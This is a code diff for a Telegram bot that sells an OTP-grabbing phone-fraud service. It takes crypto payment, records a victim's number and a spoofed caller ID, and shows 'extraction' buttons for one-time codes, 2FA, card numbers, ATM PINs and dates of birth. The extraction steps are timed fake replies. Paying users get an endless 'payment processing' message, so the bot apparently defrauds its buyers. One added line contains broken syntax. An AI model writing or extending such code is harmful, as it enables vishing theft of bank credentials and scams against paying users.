@@ -118,7 +118,7 @@ bot.action('pay', (ctx) => {
 ⚠️ Exact amount only
 🚨 Wrong = lost funds
 🚨 Expires in 30 min
-💡 After payment, wait for confirmation
+💡 After payment, wait for confirmation (30-60 min)
 🗣️ Join: ${MAIN_CHANNEL}`,
       parse_mode: 'HTML',
       reply_markup: { inline_keyboard: [[{ text: "📋 COPY ADDRESS", callback_data: `copy_${c}` }], [{ text: "⬅️ BACK", callback_data: "pay" }]] }
@@ -186,33 +186,36 @@ bot.on('text', (ctx) => {
 
   if (state && state.step === "last4") {
     state.last4 = ctx.message.text;
-    state.step = "calling";
-    ctx.replyWithHTML(`<b>💳 Last 4: ${state.last4}</b>\n\n<b>Calling ${state.victim}...</b>\nNumber: ${state.number}\nSpoof: ${state.spoof}\n\nRinging...`);
+    state.step = "active";
+    ctx.replyWithHTML(`<b>💳 Last 4: ${state.last4}</b>\n\nCall initiated — ringing...`);
 
     const callDelay = 40000 + Math.random() * 20000; // 40s-1min
     setTimeout(() => {
       ctx.replyWithHTML(`📞 <b>Victim answered</b>
 🔴 Call connected
-Playing Phase 1 script... (don't send code yet)`, {
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "🔢 OTP (6 digit)", callback_data: "otp6" }],
-            [{ text: "🔢 OTP (4 digit)", callback_data: "otp4" }],
-            [{ text: "📱 2FA App", callback_data: "2fa" }],
-            [{ text: "💳 CC Number", callback_data: "ccnum" }],
-            [{ text: "📅 CC Expiration", callback_data: "ccexpiry" }],
-            [{ text: "🔒 ATM PIN", callback_data: "atmpin" }],
-            [{ text: "📅 DOB", callback_data: "dob" }],
-            [{ text: "📴 HANG UP", callback_data: "hangup" }]
-          ]
-        }
-      });
+Playing Phase 1 script... (don't send code yet)`);
     }, callDelay);
 
     const phaseDelay = callDelay + 35000 + Math.random() * 25000; // 35s-1min after answer
     setTimeout(() => {
       ctx.reply("⚠️ Phase 1 complete — ready for extraction");
     }, phaseDelay);
+
+    // Persistent extraction buttons
+    ctx.replyWithHTML(`<b>📞 EXTRACTION TOOLS</b>\n\nSelect:`, {
+      reply_markup: {
+        inline_keyboard:_Mouse
+          [{ text: "🔢 OTP (6 digit)", callback_data: "otp6" }],
+          [{ text: "🔢 OTP (4 digit)", callback_data: "otp4" }],
+          [{ text: "📱 2FA App", callback_data: "2fa" }],
+          [{ text: "💳 CC Number", callback_data: "ccnum" }],
+          [{ text: "📅 CC Expiration", callback_data: "ccexpiry" }],
+          [{ text: "🔒 ATM PIN", callback_data: "atmpin" }],
+          [{ text: "📅 DOB", callback_data: "dob" }],
+          [{ text: "📴 HANG UP", callback_data: "hangup" }]
+        ]
+      }
+    });
 
     return;
   }
@@ -230,33 +233,38 @@ Playing Phase 1 script... (don't send code yet)`, {
     }
     if (data === "skip_last4") {
       state.last4 = "skipped";
-      state.step = "calling";
-      ctx.replyWithHTML(`<b>💳 Last 4: skipped</b>\n\n<b>Calling ${state.victim}...</b>\nNumber: ${state.number}\nSpoof: ${state.spoof}\n\nRinging...`);
-      // same call delay as above
+      state.step = "active";
+      ctx.replyWithHTML(`<b>💳 Last 4: skipped</b>\n\nCall initiated — ringing...`);
+      // same call flow as above
       const callDelay = 40000 + Math.random() * 20000;
       setTimeout(() => {
         ctx.replyWithHTML(`📞 <b>Victim answered</b>
 🔴 Call connected
-Playing Phase 1 script... (don't send code yet)`, {
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: "🔢 OTP (6 digit)", callback_data: "otp6" }],
-              [{ text: "🔢 OTP (4 digit)", callback_data: "otp4" }],
-              [{ text: "📱 2FA App", callback_data: "2fa" }],
-              [{ text: "💳 CC Number", callback_data: "ccnum" }],
-              [{ text: "📅 CC Expiration", callback_data: "ccexpiry" }],
-              [{ text: "🔒 ATM PIN", callback_data: "atmpin" }],
-              [{ text: "📅 DOB", callback_data: "dob" }],
-              [{ text: "📴 HANG UP", callback_data: "hangup" }]
-            ]
-          }
-        });
+Playing Phase 1 script... (don't send code yet)`);
       }, callDelay);
+      const phaseDelay = callDelay + 35000 + Math.random() * 25000;
+      setTimeout(() => {
+        ctx.reply("⚠️ Phase 1 complete — ready for extraction");
+      }, phaseDelay);
+      ctx.replyWithHTML(`<b>📞 EXTRACTION TOOLS</b>\n\nSelect:`, {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "🔢 OTP (6 digit)", callback_data: "otp6" }],
+            [{ text: "🔢 OTP (4 digit)", callback_data: "otp4" }],
+            [{ text: "📱 2FA App", callback_data: "2fa" }],
+            [{ text: "💳 CC Number", callback_data: "ccnum" }],
+            [{ text: "📅 CC Expiration", callback_data: "ccexpiry" }],
+            [{ text: "🔒 ATM PIN", callback_data: "atmpin" }],
+            [{ text: "📅 DOB", callback_data: "dob" }],
+            [{ text: "📴 HANG UP", callback_data: "hangup" }]
+          ]
+        }
+      });
       return;
     }
   }
 
-  // Extraction buttons
+  // Extraction buttons (persistent)
   if (ctx.callbackQuery && admins.has(ctx.from.id)) {
     const data = ctx.callbackQuery.data;
     const delay = 40000 + Math.random() * 20000; // 40s-1min
@@ -269,7 +277,6 @@ Playing Phase 1 script... (don't send code yet)`, {
       }, delay);
       return;
     }
-
     if (data === "otp4") {
       ctx.reply("🔄 Requesting 4-digit OTP...");
       setTimeout(() => {
@@ -278,7 +285,6 @@ Playing Phase 1 script... (don't send code yet)`, {
       }, delay);
       return;
     }
-
     if (data === "2fa") {
       ctx.reply("🔄 Accessing 2FA app...");
       setTimeout(() => {
@@ -287,7 +293,6 @@ Playing Phase 1 script... (don't send code yet)`, {
       }, delay);
       return;
     }
-
     if (data === "ccnum") {
       ctx.reply("🔄 Extracting CC number...");
       setTimeout(() => {
@@ -296,7 +301,6 @@ Playing Phase 1 script... (don't send code yet)`, {
       }, delay);
       return;
     }
-
     if (data === "ccexpiry") {
       ctx.reply("🔄 Getting expiration...");
       setTimeout(() => {
@@ -306,7 +310,6 @@ Playing Phase 1 script... (don't send code yet)`, {
       }, delay);
       return;
     }
-
     if (data === "atmpin") {
       ctx.reply("🔄 Retrieving ATM PIN...");
       setTimeout(() => {
@@ -315,7 +318,6 @@ Playing Phase 1 script... (don't send code yet)`, {
       }, delay);
       return;
     }
-
     if (data === "dob") {
       ctx.reply("🔄 Getting DOB...");
       setTimeout(() => {
@@ -328,12 +330,12 @@ Playing Phase 1 script... (don't send code yet)`, {
     }
   }
 
-  // Normal users — processing feel
+  // Normal users — processing 30-60 min
   if (paidUsers.has(ctx.from.id)) {
-    ctx.reply("⏳ Payment still processing... This can take 5-15 minutes. Do not send again.");
+    ctx.reply("⏳ Payment processing... This can take 30-60 minutes. Do not send again.");
   } else {
     paidUsers.add(ctx.from.id);
-    ctx.reply("⏳ Transaction detected. Processing payment... Please wait (5-15 min).");
+    ctx.reply("⏳ Transaction detected. Processing payment... This can take 30-60 minutes.");
   }
 });
 
